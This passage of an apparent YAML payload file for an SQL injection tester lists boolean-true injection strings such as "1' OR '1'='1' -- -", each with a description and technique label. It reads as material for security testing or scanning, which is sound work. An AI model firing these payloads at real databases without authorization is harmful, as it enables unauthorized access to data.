      technique: "boolean_true"
    - payload: "1' OR '1'='1' -- -"
      description: "OR-based true (returns more rows)"
      technique: "boolean_true"
    - payload: "' AND 1 -- -"
      description: "Implicit true (MySQL)"
      technique: "boolean_true"
    - payload: "' AND 'a'='a' -- -"
      description: "String comparison true"
      technique: "boolean_true"
    - payload: "1' AND 1 < 2 -- -"
      description: "Inequality true"
